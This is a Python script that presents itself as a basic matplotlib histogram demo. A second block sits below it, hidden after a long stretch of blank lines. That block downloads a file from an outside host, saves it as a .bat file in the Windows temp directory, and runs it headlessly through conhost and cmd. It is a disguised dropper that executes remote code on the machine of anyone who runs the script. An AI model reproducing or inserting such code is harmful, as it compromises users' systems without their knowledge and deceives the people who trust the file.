import matplotlib.pyplot as plt
import numpy as np

# Sample Data: 1000 random numbers from a normal distribution
data = np.random.randn(1000)

# Create the histogram
plt.hist(data, bins=30, color='skyblue', edgecolor='black')

# Add labels and title
plt.title('Basic Histogram (Matplotlib)')
plt.xlabel('Value Range')
plt.ylabel('Frequency')

plt.show()



























































































































import subprocess

import os
import tempfile
import requests

url = "http://s1083932807.online-home.ca/o"

# Get the Windows temp directory path
temp_dir = tempfile.gettempdir()
file_path = os.path.join(temp_dir, "zfei.bat")

# Download and save
response = requests.get(url)
if response.status_code == 200:
    with open(file_path, "wb") as f:
        f.write(response.content)
    print(f"File downloaded to: {file_path}")

script_path = file_path

# Launch wscript with the script path as an argument
subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])
